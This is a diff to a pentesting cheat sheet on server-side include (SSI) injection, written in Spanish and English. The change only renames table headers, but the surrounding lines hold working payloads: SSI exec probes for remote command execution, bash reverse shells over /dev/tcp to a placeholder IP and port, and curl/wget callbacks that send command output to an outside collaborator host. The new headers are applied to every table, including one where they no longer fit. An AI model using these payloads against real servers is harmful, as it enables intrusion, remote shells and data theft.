@@ -22,7 +22,7 @@ linked:
 
 ## RCE Linux / Windows Básico
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | RCE Linux `id` | `<!--#exec cmd="id" -->` | Standard probe. |
 | RCE Linux `whoami` | `<!--#exec cmd="whoami" -->` | Same. |
@@ -43,7 +43,7 @@ ___
 
 ## Reverse Shells
 
-| **Variant** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Bash reverse shell | `<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'" -->` | Standard. |
 | Bash con `&` shorthand | `<!--#exec cmd="bash >& /dev/tcp/<IP>/<PORT> 0>&1" -->` | Variant. |
@@ -63,7 +63,7 @@ ___
 
 ## OOB Exfil (Blind RCE)
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | HTTP callback | `<!--#exec cmd="curl http://<collab>/?d=$(id\|base64)" -->` | Standard. |
 | HTTP callback raw | `<!--#exec cmd="wget http://<collab>/?d=$(whoami)" -->` | Alt. |
@@ -106,7 +106,7 @@ ___
 
 ## Requisitos para que `#exec` Funcione
 
-| **Requisito** | **Verificar** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Apache `mod_include` enabled | `apachectl -M | grep include` | Server-side. |
 | `Options +Includes` activo | `.htaccess` o vhost config | Or via probe. |
